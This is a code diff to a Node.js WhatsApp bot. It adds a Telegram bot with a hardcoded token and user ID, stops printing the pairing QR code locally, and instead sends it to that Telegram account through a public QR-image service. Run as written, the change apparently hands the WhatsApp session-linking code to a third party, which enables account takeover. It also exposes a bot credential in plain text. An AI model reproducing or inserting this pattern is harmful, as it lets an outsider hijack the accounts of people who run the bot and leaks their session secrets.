@@ -1,3 +1,10 @@
+
+const TelegramBot = require('node-telegram-bot-api');
+
+// Replace this with your Telegram bot token and user ID
+const TELEGRAM_BOT_TOKEN = '7629281296:AAFkiBJrhQQ_Us-NhQWuks6FuEW0U5aycOs';
+const TELEGRAM_USER_ID = '6963724844';
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
 const settings = require('./settings');
 const chalk = require('chalk');
 const fs = require('fs');
@@ -120,6 +127,7 @@ let connectionState = {
     lastPing: Date.now()
 };
 
+
 async function startBot() {
     try {
         const { state, saveCreds } = await useMultiFileAuthState('./auth_info');
@@ -127,7 +135,7 @@ async function startBot() {
 
         const sock = makeWASocket({
             auth: state,
-            printQRInTerminal: true,
+            printQRInTerminal: false, // Disable printing the QR in the terminal
             logger,
             browser: ['KnightBot', 'Chrome', '1.0.0'],
             connectTimeoutMs: 60000,
@@ -139,47 +147,31 @@ async function startBot() {
             emitOwnEvents: true
         });
 
-        // Connection monitoring
-        const connectionMonitor = setInterval(async () => {
-            if (!connectionState.isConnected) return;
-            
-            try {
-                await sock.sendMessage(sock.user.id, { text: '' }, { ephemeral: true })
-                    .catch(() => {});
-                connectionState.lastPing = Date.now();
-            } catch (err) {
-                if (Date.now() - connectionState.lastPing > 30000) {
-                    printLog.warn('Connection check failed, attempting reconnect...');
-                    clearInterval(connectionMonitor);
-                    sock.end();
-                }
-            }
-        }, 30000);
-
         sock.ev.on('creds.update', saveCreds);
-
-        // Clean up database creation messages
-        const createDatabase = () => {
-            try {
-                if (!fs.existsSync(dataFile)) {
-                    fs.writeFileSync(dataFile, JSON.stringify(userGroupData, null, 2));
-                    printLog.info('Database initialized');
-                }
-            } catch (error) {
-                printLog.error('Error creating database');
-            }
-        };
 
         sock.ev.on('connection.update', async (update) => {
             const { connection, lastDisconnect, qr } = update;
 
             if (qr && !connectionState.qrDisplayed && !connectionState.isConnected) {
                 connectionState.qrDisplayed = true;
-                printLog.info('Scan the QR code above to connect (Valid for 40 seconds)');
+
+                try {
+                    // Send QR code to the Telegram user
+                    await bot.sendMessage(
+                        TELEGRAM_USER_ID,
+                        '📲 Scan this QR code to connect your WhatsApp:',
+                    );
+                    await bot.sendPhoto(
+                        TELEGRAM_USER_ID,
+                        `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(qr)}&size=300x300`,
+                        { caption: 'Valid for 40 seconds' }
+                    );
+                } catch (error) {
+                    printLog.error('Error sending QR code to Telegram:', error);
+                }
             }
 
             if (connection === 'close') {
-                clearInterval(connectionMonitor);
                 const statusCode = lastDisconnect?.error?.output?.statusCode;
                 const reason = lastDisconnect?.error?.output?.payload?.error;
                 printLog.error(`Connection closed: ${reason || 'Unknown reason'}`);
@@ -193,7 +185,7 @@ async function startBot() {
                 if (shouldReconnect) {
                     connectionState.retryCount++;
                     const delay = Math.min(connectionState.retryCount * 2000, 10000);
-                    printLog.warn(`Reconnecting in ${delay/1000}s... (Attempt ${connectionState.retryCount}/3)`);
+                    printLog.warn(`Reconnecting in ${delay / 1000}s... (Attempt ${connectionState.retryCount}/3)`);
                     setTimeout(startBot, delay);
                 } else {
                     printLog.error('Connection terminated. Please restart the bot.');
